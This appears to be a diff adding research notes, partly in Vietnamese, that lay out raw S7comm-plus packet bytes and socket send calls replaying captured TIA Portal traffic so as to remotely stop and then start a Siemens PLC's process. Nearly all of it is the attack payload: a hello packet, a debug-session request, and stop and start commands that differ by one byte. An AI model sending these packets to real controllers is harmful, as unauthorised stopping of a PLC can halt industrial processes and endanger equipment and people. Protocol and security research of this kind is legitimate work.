@@ -1,0 +1,108 @@
+## STOP PROCESS
+
+sock.put(packet[0])#send hello plc -> Arrival Time: Oct 21, 2022 15:15:57.223972940 BST
+# 0 dua tren TIA portal thay cho hello plc
+						"\x03\x00\x00\x23\x1e\xe0\x00\x00"+
+						"\x00\x06\x00\xc1\x02\x06\x00\xc2"+
+						"\x0f|\x53\x49\x4d\x41\x54\x49\x43"+
+						"\x2d\x52\x4f\x4f\x54\x2d\x45\x53|"+
+						"\xc0\x01\x0a",
+
+
+sock.put(packet[1])#xin 1 session debug -> Arrival Time: Oct 21, 2022 15:15:57.431586881 BST
+                 		# 1 session debug
+               			"\x03\x00\x00\xc0\x02\xf0\x80\x72"+
+               			"\x01\x00\xb1\x31\x00\x00\x04\xca"+
+               			"\x00\x00\x00\x02\x00\x00\x01\x20"+
+               			"\x36\x00\x00\x01\x1d\x00\x04\x00"+
+               			"\x00\x00\x00\x00\xa1\x00\x00\x00"+
+               			"\xd3\x82\x1f\x00\x00\xa3\x81\x69"+
+               			"\x00\x15\x16|\x53\x65\x72\x76\x65"+
+               			"\x72\x53\x65\x73\x73\x69\x6f\x6e"+
+               			"\x5f\x43|\x43\x39\x43\x33\x39\x33"+ #6
+               			"\x44\xa3\x82\x21\x00\x15\x0b\x31"+ #8
+               			"\x3a\x3a\x3a\x36\x2e\x30\x3a\x3a"+ #8
+               			"\x3a\x12\xa3\x82\x28\x00\x15\x0d"+ #8
+               			"\x4f\x4d|\x53\x2b\x20\x44\x65\x62"+ #2+6
+               			"\x75\x67\x67\x65\x72|\xa3\x82\x29"+ #5
+               			"\x00\x15\x00\xa3\x82\x2a\x00\x15"+
+               			"\x00\xa3\x82\x2b\x00\x04\x84\x80"+
+               			"\x80\x80\x00\xa3\x82\x2c\x00\x12"+
+               			"\x11\xe1\xa3\x00\xa3\x82\x2d\x00"+
+               			"\x15\x00\xa1\x00\x00\x00\xd3\x81"+
+               			"\x7f\x00\x00\xa3\x81\x69\x00\x15"+
+               			"\x15\x53\x75\x62\x73\x63\x72\x69"+
+               			"\x70\x74\x69\x6f\x6e\x43\x6f\x6e"+
+               			"\x74\x61\x69\x6e\x65\x72\xa2\xa2"+
+               			"\x00\x00\x00\x00\x72\x01\x00\x00",
+
+sock.put(packet[3])#send hello plc
+						# 3 unknown
+                		"\x03\x00\x00\x07\x02\xf0\x00",
+Arrival Time: Oct 21, 2022 15:15:57.474165267 BST
+Arrival Time: Oct 21, 2022 15:16:07.475564152 BST
+
+sock.put(pac.gsub("\x35\x34\x34\x82\x41", arr[4][0..4])) # (several times?)
+
+sock.put(packet[3])#send uknown packet to plc
+						# 3 unknown
+                		"\x03\x00\x00\x07\x02\xf0\x00",
+
+## GOTO STOP:
+
+sock.put(packet[6].gsub("\xff",[scr].pack("c")))#send hello plc -> Arrival Time: Oct 21, 2022 15:16:17.486364625 BST
+
+# 6 truoc start-stop
+                		"\x03\x00\x00\x42\x02\xf0\x80"+
+                		"\x72\x02\x00\x33\x31\x00\x00\x04"+
+                		"\xfc\x00\x00\x00\x07\x00\x00\x03"+
+                		"\xff\x36\x00\x00\x00\x34\x02\x91"+
+                		"\x3d\x9b\x1e\x00\x00\x04\xe8\x89"+
+                		"\x69\x00\x12\x00\x00\x00\x00\x89"+
+                		"\x6a\x00\x13\x00\x89\x6b\x00\x04"+
+                		"\x00\x00\x00\x00\x00\x00\x00\x72"+
+                		"\x02\x00\x00",
+
+sock.put(packet[8].gsub("\xff",[scr].pack("c")))#send hello plc -> Arrival Time: Oct 21, 2022 15:16:17.697839961 BST
+# 8 stop
+						"\x03\x00\x00\x43\x02\xf0\x80"+
+                		"\x72\x02\x00\x34\x31\x00\x00\x04"+
+                		"\xf2\x00\x00\x00\x08\x00\x00\x03"+
+                		"\xff\x36\x00\x00\x00\x34\x01\x90"+
+                		"\x77\x00\x08\x01\x00\x00\x04\xe8"+  # diff on this line
+                		"\x89\x69\x00\x12\x00\x00\x00\x00"+
+                		"\x89\x6a\x00\x13\x00\x89\x6b\x00"+
+                		"\x04\x00\x00\x00\x00\x00\x00\x00"+
+                		"\x72\x02\x00\x00",
+
+## ===================================================================================
+
+## START PROCESS
+
+sock.put(packet[0])#send hello plc
+
+sock.put(packet[1])#xin 1 session debug
+
+sock.put(packet[3])#send hello plc
+
+sock.put(pac.gsub("\x35\x34\x34\x82\x41", arr[4][0..4])) # (several times?)
+
+sock.put(packet[3])#send uknown packet to plc
+
+## GOTO START:
+
+sock.put(packet[6].gsub("\xff",[scr].pack("c")))#send hello plc
+
+sock.put(packet[7].gsub("\xff",[scr].pack("c")))#send hello plc
+# 7 start
+						"\x03\x00\x00\x43\x02\xf0\x80"+
+                		"\x72\x02\x00\x34\x31\x00\x00\x04"+
+                		"\xf2\x00\x00\x00\x08\x00\x00\x03"+
+                		"\xff\x36\x00\x00\x00\x34\x01\x90"+
+                		"\x77\x00\x08\x03\x00\x00\x04\xe8"+  # diff on this line
+                		"\x89\x69\x00\x12\x00\x00\x00\x00"+
+                		"\x89\x6a\x00\x13\x00\x89\x6b\x00"+
+                		"\x04\x00\x00\x00\x00\x00\x00\x00"+
+                		"\x72\x02\x00\x00",
+
+## ===================================================================================
